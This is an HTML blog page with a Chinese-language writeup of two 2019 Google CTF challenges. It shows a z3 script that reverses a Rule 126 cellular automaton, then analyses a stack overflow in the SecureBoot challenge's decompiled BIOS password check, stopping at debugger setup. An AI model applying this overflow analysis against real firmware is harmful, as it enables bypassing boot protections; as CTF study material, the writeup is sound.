@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>2019-googlectf-writeup-part2 | Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="2019 googlectf writeup 下半段">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019-googlectf-writeup-part2">
+<meta property="og:url" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:description" content="2019 googlectf writeup 下半段">
+<meta property="og:locale">
+<meta property="og:image" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/wp04.png">
+<meta property="og:image" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/wp11.png">
+<meta property="og:image" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/wp12.png">
+<meta property="og:image" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/wp13.png">
+<meta property="og:image" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/wp14.png">
+<meta property="og:image" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/wp15.png">
+<meta property="article:published_time" content="2019-07-30T15:31:47.000Z">
+<meta property="article:modified_time" content="2023-04-07T12:29:53.446Z">
+<meta property="article:author" content="All Members">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="googlectf">
+<meta property="article:tag" content="Crypto">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://asuri.org/2019/07/30/2019-googlectf-writeup-part2/wp04.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-2019-googlectf-writeup-part2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/30/2019-googlectf-writeup-part2/" class="article-date">
+  <time datetime="2019-07-30T15:31:47.000Z" itemprop="datePublished">2019-07-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2019-googlectf-writeup-part2
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/f4436263f3150c6b60b87869224e99e3?s=48">
+    <div class="article-author-info">
+      <a href="/author/l1nk" class="article-author-name">l1nk</a>
+      <a target="_blank" rel="noopener" href="http://showlinkroom.me/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="想要混入安全圈的菜鸡，只会搞简单的bin">想要混入安全圈的菜鸡，只会搞简单的bin</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>2019 googlectf writeup 下半段</p>
+<a id="more"></a>
+
+<h2 id="2019-GoogleCTF-part2"><a href="#2019-GoogleCTF-part2" class="headerlink" title="2019 GoogleCTF part2"></a>2019 GoogleCTF part2</h2><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Reverse-a-cellular-automata"><a href="#Reverse-a-cellular-automata" class="headerlink" title="Reverse a cellular automata"></a>Reverse a cellular automata</h2><p>本质上为一个算法题（大雾）</p>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>题目描述是说，当前使用了一种叫做胞元自动机<strong>cellular automata</strong>的东西（就是题目里面那个东西）的算法。这个东西解释起来有、、复杂，不过现实中很多地方都见过。胞元自动机相当于是定义了一种规则。假设我们定义了如下的<code>3*3</code>的方块:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D; &#x3D; &#x3D;</span><br><span class="line">&#x3D; &#x3D; &#x3D;</span><br><span class="line">&#x3D; &#x3D; &#x3D;</span><br></pre></td></tr></table></figure>
+<p>假定如下的规则:</p>
+<ul>
+<li><code>=</code>表示活着的细胞</li>
+<li><code>+</code>表示死了的细胞</li>
+<li>定义一个规则：如果细胞四周（上下左右）有&gt;=3个细胞存在，由于细胞养料不足，当前的细胞会死亡；否则，因为养料充足，细胞会重新活过来</li>
+</ul>
+<p>胞元自动机是以<strong>状态</strong>为概念的。也就是说每一个细胞只考虑当前状态下周围的养料情况，不考虑下一个状态。那么根据规则，下一个状态的方块中的细胞会变成:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D; + &#x3D;</span><br><span class="line">+ + +</span><br><span class="line">&#x3D; + &#x3D;</span><br></pre></td></tr></table></figure>
+<p>可以注意到，此时<strong>“死去”</strong>了很多个细胞。虽然根据资源分配的话，四周的细胞死亡后，正中间的细胞本来是不必死去的，但是根据状态，它也会进入这个状态。然后再下一个状态就是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D; &#x3D; &#x3D;</span><br><span class="line">&#x3D; &#x3D; &#x3D;</span><br><span class="line">&#x3D; &#x3D; &#x3D;</span><br></pre></td></tr></table></figure>
+<p>恢复成最初的形状。这种就叫做胞元自动机的变化过程。<br>有很多的胞元自动机规则，分别就是规定了这种变化过程。题目中给出的<code>Wolfram rule 126</code>也是一种变化的规则:<br><img src="/2019/07/30/2019-googlectf-writeup-part2/wp04.png"><br>第一排为当前状态。也就是说仅仅在<strong>当前状态以及相邻两个状态均相等的时候，当前状态转变成0，否则转变成1</strong></p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>题目中给出了一个密文，并且给出了一个64bit下的胞元自动机生成的数字，推测出上一个状态，对应的数字作为密文的密钥即可解开答案:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Flag (base64)</span><br><span class="line">U2FsdGVkX1&#x2F;andRK+WVfKqJILMVdx&#x2F;69xjAzW4KUqsjr98GqzFR793lfNHrw1Blc8UZHWOBrRhtLx3SM38R1MpRegLTHgHzf0EAa3oUeWcQ&#x3D;</span><br><span class="line">Obtained step (in hex)</span><br><span class="line">66de3c1bf87fdfcf</span><br></pre></td></tr></table></figure>
+<p>这里观察<code>Rule 126</code>，可以发现一些规律。这里推荐网站<a target="_blank" rel="noopener" href="https://www.wolframalpha.com/input/?i=Rule+126">https://www.wolframalpha.com/input/?i=Rule+126</a>，里面已经帮我们总结了规律。<br>这种有规律，求解的问题都可以用<code>z3</code>来解决。这里参考<a target="_blank" rel="noopener" href="https://blog.julianjm.com/Google-CTF-2019/#Automata">https://blog.julianjm.com/Google-CTF-2019/#Automata</a>照着写了一个:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">64</span></span><br><span class="line">target = <span class="number">0x66de3c1bf87fdfcf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Solver, which will help to get answer</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># define the cell rule </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cell</span>(<span class="params">p, q, r</span>):</span></span><br><span class="line">    <span class="keyword">return</span> Or(Xor(p,q), Xor(p,r))</span><br><span class="line"></span><br><span class="line"><span class="comment">#define the step for get step-answer</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step</span>(<span class="params">src</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [cell(src[i-<span class="number">1</span>], src[i], src[(i+<span class="number">1</span>)%BITS]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(BITS)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># define Bool array</span></span><br><span class="line">src = BoolVector(<span class="string">&quot;src&quot;</span>, BITS)</span><br><span class="line"><span class="comment"># and calculate the dst</span></span><br><span class="line">dst = step(src)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now add restriction</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(BITS):</span><br><span class="line">    mask = <span class="number">1</span> &lt;&lt; (BITS - <span class="number">1</span> - i)</span><br><span class="line">    solver.add (dst[i] == <span class="built_in">bool</span>(target &amp; mask))</span><br><span class="line"></span><br><span class="line"><span class="comment"># and calculate answer</span></span><br><span class="line"><span class="keyword">while</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line"></span><br><span class="line">    solbits = <span class="string">&quot;&quot;</span>.join([<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> model.<span class="built_in">eval</span>(src[i]) <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(BITS)])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;%x&quot;</span>%<span class="built_in">int</span>(solbits, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># here we add a list into solver to tell solver that we don&#x27;t need this kind of answer, so </span></span><br><span class="line">    <span class="comment"># z3 will show another answer</span></span><br><span class="line">    solver.add(Or([ model[v]!=v <span class="keyword">for</span> v <span class="keyword">in</span> src]))</span><br></pre></td></tr></table></figure>
+<p><em>基本上是把人家的搬运了一下。。。</em><br>这个输出非常多，可以用bash脚本之类的主动调用题目中给出的解题指令，即可得到答案。</p>
+<h2 id="SecureBoot"><a href="#SecureBoot" class="headerlink" title="SecureBoot"></a>SecureBoot</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your task is very simple: just boot this machine. We tried before but we always get ‘Security Violation’. For extra fancyness use socat -,raw,echo&#x3D;0 tcp:$IP:$PORT&#39;.</span><br></pre></td></tr></table></figure>
+
+<p>这个题目是一个pwn题，从名字中可以知道应该是和一个叫做<strong>Secure Boot</strong>的特性相关的一个题目。这个特性其实是关于UEFI(Unified Extensible Firmware Interface)的一个子特性。</p>
+<p>用<code>binwalk</code>查看之后，发现是一个UEFI文件，然后用<code>UEFITool</code>查看之后发现里面内容如下:<br><img src="/2019/07/30/2019-googlectf-writeup-part2/wp11.png"><br>官方给出的<code>run.py</code>脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">fname = tempfile.NamedTemporaryFile().name</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;cp OVMF.fd %s&quot;</span> % (fname))</span><br><span class="line">os.system(<span class="string">&quot;chmod u+w %s&quot;</span> % (fname))</span><br><span class="line">os.system(<span class="string">&quot;qemu-system-x86_64 -monitor /dev/null -m 128M -drive if=pflash,format=raw,file=%s -drive file=fat:rw:contents,format=raw -net none -nographic 2&gt; /dev/null&quot;</span> % (fname))</span><br><span class="line">os.system(<span class="string">&quot;rm -rf %s&quot;</span> % (fname))</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>qemu</code>那段启动的内容意思为:</p>
+<ul>
+<li><code>-monitor /dev/null</code>：将监视器重定向到主机的空白设备。</li>
+<li><code>-m 128M</code>: 设置启动时候的RAM大小为128M</li>
+<li><code>-drive if=pflash,format=raw,file=%s</code>: 设置一个驱动，同时可以设置相关的设备类型。这里设置的设备接口为<code>pflash</code>(闪存，相当于是连接了bios的那个东东)，磁盘格式为<code>raw</code>，意味着不需要检测格式头，然后定义了当前的<code>OVMF.fd</code>作为当前的操作镜像。这句话相当于是<strong>模拟了一个写有UEFI的闪存挂载到操作系统上的一个过程</strong></li>
+<li><code>-drive file=fat:rw:contents,format=raw</code>： 同理，这句话设置了一个驱动，不过这里是将<code>contents</code>目录作为硬盘格式挂载到这上面（标注为raw之后就不需要关注是不是MBR/GPT的磁盘了）</li>
+<li><code>-net none</code>: 不支持网络通信</li>
+<li><code>2 &gt; /dev/null</code>: 重定向错误流</li>
+</ul>
+<p>尝试运行这段内容后，程序会输出:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Mapping table</span><br><span class="line">      FS0: Alias(s):HD1a1:;BLK3:</span><br><span class="line">          PciRoot(0x0)&#x2F;Pci(0x1,0x1)&#x2F;Ata(0x0)&#x2F;HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)</span><br><span class="line">     BLK0: Alias(s):</span><br><span class="line">          PciRoot(0x0)&#x2F;Pci(0x1,0x0)&#x2F;Floppy(0x0)</span><br><span class="line">     BLK1: Alias(s):</span><br><span class="line">          PciRoot(0x0)&#x2F;Pci(0x1,0x0)&#x2F;Floppy(0x1)</span><br><span class="line">     BLK2: Alias(s):</span><br><span class="line">          PciRoot(0x0)&#x2F;Pci(0x1,0x1)&#x2F;Ata(0x0)</span><br><span class="line">     BLK4: Alias(s):</span><br><span class="line">          PciRoot(0x0)&#x2F;Pci(0x1,0x1)&#x2F;Ata(0x0)</span><br><span class="line"></span><br><span class="line">If Secure Boot is enabled it will verify kernel&#39;s integrity and</span><br><span class="line">return &#39;Security Violation&#39; in case of inconsistency.</span><br><span class="line">Booting...</span><br><span class="line">Script Error Status: Security Violation (line number 5)</span><br></pre></td></tr></table></figure>
+<p>根据输出，我们知道当前的<code>OVMF.fd</code>中的UEFI开启了<code>SecureBoot</code>的特性，而当前内核并没有签名，导致了内核没有能够加载。</p>
+<h3 id="企图绕过"><a href="#企图绕过" class="headerlink" title="企图绕过"></a>企图绕过</h3><p>在UEFI加载的时候，有四个阶段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SEC(安全检测，完成从flat mode 到 real mode)--PEI(EFI前期初始化，初始化各个模块，CPU&#x2F;IO等等)--DXE(初始化各类驱动)--BDS(初始化键鼠驱动，VGA等等)</span><br></pre></td></tr></table></figure>
+<p>但在这四个阶段之后，还会有一个叫做<code>TSL(操作系统加载前期)</code>的阶段，这个阶段中就是在最初的UEFI加载完成之后（但是还没有尝试开始运行的时候），会从主板上(CMOS处)加载关于UEFI的配置（也就是通常说的进入BIOS）。在这之后才会正式进入<code>RT(Runtime)</code>加载操作系统等等。<br>所以想到，我们可以通过手动修改BIOS的配置来关闭<code>SecureBoot</code>。但是该题没有告诉我们到底怎么进入BIOS，此时只能一通乱按，终于发现是在按下了<code>f12</code>的时候可以打开这个界面:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BdsDxe: loading Boot0000 &quot;UiApp&quot; from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)&#x2F;FvFile(462CAA21-7614-4503-836E-8AB6F4662331)</span><br><span class="line">BdsDxe: starting Boot0000 &quot;UiApp&quot; from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)&#x2F;FvFile(462CAA21-7614-4503-836E-8AB6F4662331)</span><br><span class="line">****************************</span><br><span class="line">*                          *</span><br><span class="line">*   Welcome to the BIOS!   *</span><br><span class="line">*                          *</span><br><span class="line">****************************</span><br><span class="line"></span><br><span class="line">Password?</span><br><span class="line">****</span><br></pre></td></tr></table></figure>
+<p>这里会发现，程序在<code>DXE</code>阶段加载了一个好叫做<code>UiAPP</code>的文件，并且要求我们输入密码。于是这里想到说，这个<code>UiAPP</code>可能是实现了输入密码功能的一个自定义的EFI文件。此时我们注意到<code>7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1</code>这个值，这个值我们在<code>UEFITool</code>的截图中看到过。<br><img src="/2019/07/30/2019-googlectf-writeup-part2/wp12.png"><br>于是想到，能不能将这个文件导出来看一下。这里使用工具<code>uefi-firmware-parser</code>进行导出:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uefi-firmware-parser -ecO .&#x2F;OVMF.fd</span><br></pre></td></tr></table></figure>
+<p>输出中可以开到如下的内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">File 38: 462caa21-7614-4503-836e-8ab6f4662331 type 0x09, attr 0x00, state 0x07, size 0x1beae (114350 bytes), (application)</span><br><span class="line">Section 0: type 0x10, size 0x1be44 (114244 bytes) (PE32 image section)</span><br><span class="line">Section 1: type 0x19, size 0x34 (52 bytes) (Raw section)</span><br><span class="line">Section 2: type 0x15, size 0x10 (16 bytes) (User interface name section)</span><br><span class="line">Name: UiApp</span><br><span class="line">Section 3: type 0x14, size 0xe (14 bytes) (Version section section)</span><br></pre></td></tr></table></figure>
+<p>这段就是我们需要找到的内容(目录有点深，得搜索出来才行)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecureBoot\OVMF.fd_output\volume-0\file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792\section0\section3\volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf\file-462caa21-7614-4503-836e-8ab6f4662331</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>首先利用全局搜索找到字符串L”Password”，发现其相关函数如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 checkPassword()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int16 index; &#x2F;&#x2F; ax</span><br><span class="line">  char v2; &#x2F;&#x2F; [rsp+2Ch] [rbp-BCh]</span><br><span class="line">  __int16 chr; &#x2F;&#x2F; [rsp+2Eh] [rbp-BAh]</span><br><span class="line">  char v4; &#x2F;&#x2F; [rsp+30h] [rbp-B8h]</span><br><span class="line">  char buffer[128]; &#x2F;&#x2F; [rsp+38h] [rbp-B0h]</span><br><span class="line">  __int64 v6; &#x2F;&#x2F; [rsp+B8h] [rbp-30h]</span><br><span class="line">  _QWORD *v7; &#x2F;&#x2F; [rsp+C0h] [rbp-28h]</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; [rsp+C8h] [rbp-20h]</span><br><span class="line">  unsigned __int16 i; &#x2F;&#x2F; [rsp+D6h] [rbp-12h]</span><br><span class="line">  unsigned __int64 error_time; &#x2F;&#x2F; [rsp+D8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  error_time &#x3D; 0i64;</span><br><span class="line">  v8 &#x3D; 32i64;</span><br><span class="line">  wputs(L&quot;****************************\n&quot;);</span><br><span class="line">  wputs(L&quot;*                          *\n&quot;);</span><br><span class="line">  wputs(L&quot;*   Welcome to the BIOS!   *\n&quot;);</span><br><span class="line">  wputs(L&quot;*                          *\n&quot;);</span><br><span class="line">  wputs(L&quot;****************************\n\n&quot;);</span><br><span class="line">  v7 &#x3D; (_QWORD *)Initialize(32i64);</span><br><span class="line">  while ( error_time &lt;&#x3D; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    wputs(L&quot;Password?\n&quot;);</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 &#x3D; (*(__int64 (__fastcall **)(_QWORD, char *))(*(_QWORD *)(qword_1BC68 + 48) + 8i64))(</span><br><span class="line">               *(_QWORD *)(qword_1BC68 + 48),</span><br><span class="line">               &amp;v2);</span><br><span class="line">        if ( v6 &gt;&#x3D; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( chr )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v6 &#x3D;&#x3D; 0x8000000000000006i64 )</span><br><span class="line">          (*(void (__fastcall **)(__int64, __int64, char *))(qword_1BC78 + 96))(</span><br><span class="line">            1i64,</span><br><span class="line">            *(_QWORD *)(qword_1BC68 + 48) + 16i64,</span><br><span class="line">            &amp;v4);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( chr &#x3D;&#x3D; &#39;\r&#39; )</span><br><span class="line">        break;</span><br><span class="line">      if ( i &lt;&#x3D; 139u )</span><br><span class="line">      &#123;</span><br><span class="line">        index &#x3D; i++;</span><br><span class="line">        buffer[index] &#x3D; chr;</span><br><span class="line">      &#125;</span><br><span class="line">      wputs(&quot;*&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    buffer[i] &#x3D; 0;</span><br><span class="line">    wputs(L&quot;\n&quot;);</span><br><span class="line">    sha256((__int64)buffer, i, (__int64)v7);</span><br><span class="line">    if ( *v7 &#x3D;&#x3D; 0xDEADBEEFDEADBEEFi64</span><br><span class="line">      &amp;&amp; v7[8] &#x3D;&#x3D; 0xDEADBEEFDEADBEEFi64</span><br><span class="line">      &amp;&amp; v7[16] &#x3D;&#x3D; 0xDEADBEEFDEADBEEFi64</span><br><span class="line">      &amp;&amp; v7[24] &#x3D;&#x3D; 0xDEADBEEFDEADBEEFi64 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_C46((__int64)v7);</span><br><span class="line">      return 1i64;</span><br><span class="line">    &#125;</span><br><span class="line">    wputs(&quot;W&quot;);</span><br><span class="line">    ++error_time;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C46((__int64)v7);</span><br><span class="line">  return 0i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序要求我们输入128个字节，然后将这128个字节进行sha256，结果要为四个<code>DEADBEEFDEADBEEF</code>的时候，就会返回1表示密码输入正确。<br>这里会发现一个很显眼的漏洞点:程序允许我们读入140字节，但是申请的空间却只有128个字节那么大。总共可以多溢出12个字节。由于这里是位于EFI程序中，此时地址并不是特别高位，所以可以粗略的认为我们<strong>此时可以修改v6和v7处的变量</strong>。</p>
+<p>从定义上可以发现，v7是一个地址，而我们栈溢出又正好可以溢出到v7的地址处，于是一个自然的想法就是，<strong>通过爆破sha256，得到一个粗略任意地址写</strong>的一个漏洞（因为必须要将buffer进行sha256，所以这个写入也不是那么受控制，不过如果控制了v7相当于是可以往部分位置写数据了）</p>
+<p>那么要往哪里写呢？这个倒是一个大问题，毕竟这个题目不是在通常的运行环境下，没有<code>libc</code>等一系列东西，所以得考虑用别的办法。不过其实考虑到，<strong>分页保护这个过程发生在操作系统加载之后</strong>，那么应该会意识到，此时的EFI程序<strong>应该是不存在页保护的</strong>。</p>
+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>修改题目中给出的<code>run.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">fname = tempfile.NamedTemporaryFile().name</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;cp OVMF.fd %s&quot;</span> % (fname))</span><br><span class="line">os.system(<span class="string">&quot;chmod u+w %s&quot;</span> % (fname))</span><br><span class="line">print(<span class="string">&quot;Here&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;qemu-system-x86_64 -monitor /dev/null -m 128M -drive if=pflash,format=raw,file=%s -drive file=fat:rw:contents,format=raw -net none -gdb tcp::1234 -S -nographic 2&gt; /dev/null&quot;</span> % (fname))</span><br><span class="line"><span class="comment"># 增加gdb选项，并且增加-S，表示等待调试器连接上才运行</span></span><br><span class="line">os.system(<span class="string">&quot;rm -rf %s&quot;</span> % (fname))</span><br></pre></td></tr></table></figure>
+<p>之后启动gdb，然后输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
